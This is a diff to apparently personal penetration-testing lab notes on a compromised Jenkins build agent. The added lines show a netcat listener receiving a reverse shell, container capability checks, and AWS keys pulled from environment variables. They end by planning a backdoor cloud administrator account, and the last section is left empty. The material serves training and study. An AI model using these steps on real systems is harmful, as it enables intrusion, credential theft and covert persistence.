@@ -1314,6 +1314,15 @@ pipeline {
   }
 }
 ```
+- Login with the shell using particular port
+```bash
+nc -nvlp 4242
+listening on [any] 4242 ...
+connect to [10.0.1.78] from (UNKNOWN) [198.18.53.73] 54980
+bash: cannot set terminal process group (58): Inappropriate ioctl for device
+bash: no job control in this shell
+```
+### Enumerating the Builder
 - Response from the shell
 ```powershell
 jenkins@5224aadecddc:~/agent/workspace/image-transform$ **whoami**
@@ -1351,7 +1360,7 @@ ifconfig, ip a # command not found
 cat /proc/mounts
 ```
 - The output confirms that this is indeed a Docker container. However, we don't find any additional mounts. We should also check whether this container carries a high level of privileges. Docker containers can run as "privileged", which gives the container a significant amount of permissions over the host. The "privileged" configuration for a container includes excess Linux capabilities, access to Linux devices, and more. We can determine if we're in this higher permission level by checking the contents of /proc/1/status and searching for Cap in the output.
-````bash
+```bash
 jenkins@5224aadecddc:~/.ssh$ cat /proc/1/status | grep Cap
 cat /proc/1/status | grep Cap
 CapInh: 0000000000000000
@@ -1359,6 +1368,29 @@ CapPrm: 0000003fffffffff
 CapEff: 0000003fffffffff
 CapBnd: 0000003fffffffff
 ```
+- The values in CapPrm, CapEff, and CapBnd represent the list of capabilities. However, they're currently encoded, so we'll have to decode them into something more useful. We can do this using Kali's capsh utility.
+```bash
+capsh --decode=0000003fffffffff
+```
+- While this might be possible, we also know that we executed our reverse shell with AWS credentials. Let's find those credentials in the environment variables. We'll use env to list all environment variables and use grep to only display the items with AWS in the name.
+```bash
+env
+env | grep AWS
+env | grep AWS # Copy the details then used for the backdoor
+# AWS_DEFAULT_REGION=us-east-1
+# AWS_REGION=us-east-1
+# AWS_SECRET_ACCESS_KEY=+oQMj10R5eOx18Uy7AnJ0GTLTF+mRmFXKaDxMq1# # Instead # it is C
+# AWS_ACCESS_KEY_ID=AKIA55D2EIRFOKKIMGD# # Instead # it is C
+```
+- We can save the details further by getting the backdoor.
+## Compromising the Environment via Backdoor Account
+- Public cloud providers provide very fine-tuned access control using complex policies. Whenever we discover credentials, **we first need to determine what we can access with them. Once we determine what actions we can perform, our next step is to create another administrator account as a backdoor**, if possible.
+- After gaining initial access, we might need to establish persistence in the environment. One common technique in cloud settings is creating a Backdoor Cloud Account [T1136.003](https://attack.mitre.org/techniques/T1136/003), which allows us to maintain access over time by leveraging a legitimate, but covert, foothold.
+- Topics
+     - Discovering What We Have Access To
+     - Creating a Backdoor Account
+### Discovering What We Have Access To
+- 
 
 # Special Thanks to the Creator of tools and Community
 [![](https://github.com/WithSecureLabs.png?size=50)](https://github.com/WithSecureLabs)
